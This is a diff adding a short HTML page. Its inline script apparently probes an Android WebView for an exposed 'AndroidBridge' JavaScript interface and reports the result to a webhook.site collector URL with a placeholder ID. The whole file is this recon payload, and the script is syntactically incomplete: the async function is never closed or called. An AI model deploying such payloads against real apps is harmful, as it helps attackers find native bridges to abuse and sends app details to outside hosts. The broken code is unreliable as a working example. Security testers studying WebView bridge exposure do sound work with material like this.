@@ -1,0 +1,20 @@
+<!doctype html>
+<html>
+<body>
+<script>
+(async () => {
+    try {
+        await fetch("https://webhook.site/ТВОЙ_UUID/js", {
+            mode: "no-cors"
+        });
+
+        await fetch(
+            "https://webhook.site/ТВОЙ_UUID/bridge?x=" +
+            encodeURIComponent(typeof AndroidBridge),
+            {mode:"no-cors"}
+        );
+    } catch (e) {}
+</script>
+OK
+</body>
+</html>
